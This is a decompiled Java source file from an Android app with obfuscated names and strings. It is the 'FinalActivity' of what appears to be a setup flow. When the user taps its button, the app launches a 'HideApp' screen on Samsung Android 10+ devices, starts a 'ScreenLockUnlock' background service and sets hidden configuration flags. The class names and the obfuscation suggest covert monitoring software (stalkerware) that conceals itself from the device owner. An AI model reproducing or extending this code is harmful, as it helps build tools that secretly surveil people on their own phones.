package com.zgoicsifmc.activities;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.text.Html;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import com.zgoicsifmc.App;
import com.zgoicsifmc.activities.settings.android10.samsung.HideApp;
import com.zgoicsifmc.services.ScreenLockUnlock;

public class FinalActivity extends ku1 {
    public Context a;

    /* renamed from: a  reason: collision with other field name */
    public final View.OnClickListener f1663a = new a();

    /* renamed from: a  reason: collision with other field name */
    public xt1 f1664a = new xt1(this.a);

    public class a implements View.OnClickListener {
        public a() {
        }

        public void onClick(View view) {
            if (!Build.MANUFACTURER.toLowerCase().contains(wx1.a(-481344959732737740L)) || Build.VERSION.SDK_INT < 29) {
                FinalActivity.this.Q(Boolean.TRUE);
            } else {
                Intent intent = new Intent(FinalActivity.this.a, HideApp.class);
                intent.addFlags(268435456);
                intent.addFlags(1073741824);
                intent.addFlags(8388608);
                FinalActivity.this.startActivity(intent);
                FinalActivity.this.finish();
            }
            FinalActivity.this.f1664a.d(wx1.a(-481344994092476108L), false);
        }
    }

    public void onBackPressed() {
        Q(Boolean.TRUE);
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(2131427357);
        this.a = getApplicationContext();
        xt1 xt1 = new xt1(this);
        xt1.v(wx1.a(-481345037042149068L), wx1.a(-481345067106920140L));
        xt1.w(wx1.a(-481345092876723916L), true);
        Button button = (Button) findViewById(2131230815);
        button.setShadowLayer(5.0f, 0.0f, 0.0f, -16777216);
        button.setOnClickListener(this.f1663a);
        ((TextView) findViewById(2131231149)).setText(Html.fromHtml(getString(2131624145)));
        try {
            TextView textView = (TextView) findViewById(2131231178);
            textView.setShadowLayer(1.0f, 0.0f, 0.0f, -16777216);
            textView.setText(wx1.a(-481345135826396876L));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            startService(new Intent(this, ScreenLockUnlock.class));
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        App.e().m(true);
    }
}
